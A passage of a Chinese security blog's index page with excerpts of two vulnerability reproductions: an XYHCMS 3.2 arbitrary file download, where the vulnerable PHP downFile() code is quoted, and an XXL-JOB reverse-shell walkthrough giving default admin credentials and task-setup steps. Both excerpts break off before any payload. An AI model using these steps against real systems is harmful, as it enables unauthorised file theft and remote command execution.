  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XYHCMS-3-2-后台任意文件下载"><a href="#XYHCMS-3-2-后台任意文件下载" class="headerlink" title="XYHCMS 3.2 后台任意文件下载"></a>XYHCMS 3.2 后台任意文件下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>没有对下载的文件做任何限制</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XYHCMS 3.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/App/Manage/Controller/DatabaseController.class.php</code>的downfile()方法</p>
<pre><code>public function downFile() &#123;  
    if (empty($_GET[&#39;file&#39;]) || empty($_GET[&#39;type&#39;]) || !in_array($_GET[&#39;type&#39;], array(&quot;zip&quot;, &quot;sql&quot;))) &#123;  
        $this-&gt;error(&quot;下载地址不存在&quot;);  
    &#125;  
    $path     = array(&quot;zip&quot; =&gt; $this-&gt;getDbPath() . &quot;Zip/&quot;, &quot;sql&quot; =&gt; $this-&gt;getDbPath() . &#39;/&#39;);  
    $filePath = $path[$_GET[&#39;type&#39;]] . $_GET[&#39;file&#39;];  
    if (!file_exists($filePath)) &#123;  
        $this-&gt;error(&quot;该文件不存在，可能是被删除&quot;);  
    &#125;  
     $filename = basename($filePath);  
     header(&quot;Content-type: application/octet-stream&quot;);  
     header(&#39;Content-Disposition: attachment; filename=&quot;&#39; . $filename . &#39;&quot;&#39;);  
     header(&quot;Content-Length: &quot; . filesize($filePath));  
     readfile($filePath);  
 &#125;
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XYHCMS/XYHCMS%203.2%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qyup00n0y8v16do97nuo" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-XXL-JOB/XXL-JOB 任务调度中心 反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%8F%8D%E5%BC%B9shell/" class="article-date">
  <time datetime="2022-07-08T06:26:08.239Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XXL-JOB-任务调度中心-后台反弹shell"><a href="#XXL-JOB-任务调度中心-后台反弹shell" class="headerlink" title="XXL-JOB 任务调度中心 后台反弹shell"></a>XXL-JOB 任务调度中心 后台反弹shell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>弱口令登录 账号：admin 密码：123456（XXL-JOB的默认账号、密码）</p>
<p><img src="/resource/XXL-JOB%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%E5%8F%8D%E5%BC%B9shell/media/rId24.png" alt="1.png"></p>
<p>点击任务管理、新增一个执行任务，配置如下（运行模式选择shell，cron是linux定时任务，如下0时0分0秒执行一次）：</p>
<p><img src="/resource/XXL-JOB%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%E5%8F%8D%E5%BC%B9shell/media/rId25.png" alt="2.png"></p>
<p><img src="/resource/XXL-JOB%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%E5%8F%8D%E5%BC%B9shell/media/rId26.png" alt="3.png"></p>
<p>进入GLUE面板，写入执行的脚本命令。随意命名备注名称，保存并关闭</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%8F%8D%E5%BC%B9shell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/XXL-JOB/XXL-JOB%20%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83%20%E5%8F%8D%E5%BC%B9shell/" data-id="cl5c2qyup00mzy8v1h02sdfrz" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/18/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/20/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>